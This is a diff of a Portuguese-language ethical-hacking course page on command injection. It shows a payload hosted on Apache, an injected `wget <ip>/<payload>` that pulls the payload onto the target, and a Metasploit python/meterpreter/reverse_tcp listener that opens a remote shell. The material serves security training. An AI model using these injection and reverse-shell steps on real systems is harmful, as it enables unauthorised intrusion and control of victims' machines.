@@ -86,9 +86,19 @@ $ ls /var/www/html
 index.html  index.lighttpd.html  index.nginx-debian.html  meu_payload.py
 ```
 ### Passo 3 - copiar o payload para a máquina alvo
-`; wget <ip>/<payload>`
+Injeção do comando`wget <ip>/<payload>`
+
+![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb4da44a9523c4e5eb6f7faca41aa8c174cc39a8/7%20-%20websites/ci-m-1.png)
+
+Verificação do upload do arquivo:
+
+![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb4da44a9523c4e5eb6f7faca41aa8c174cc39a8/7%20-%20websites/ci-m-2.png)
+
+![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb4da44a9523c4e5eb6f7faca41aa8c174cc39a8/7%20-%20websites/ci-m-3.png)
+
 ### Passo 4 - encerrar o serviço web
 `$ sudo service apache2 stop `
+
 ## Execução do ataque
 
 ### Passo 1 - iniciar a escuta
@@ -110,7 +120,7 @@ payload => python/meterpreter/reverse_tcp
 ```
 ### Passo 2 - Executar o payload no alvo
 
-
+![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/bb4da44a9523c4e5eb6f7faca41aa8c174cc39a8/7%20-%20websites/ci-m-4.png)
 
 ### Resultado
 ```
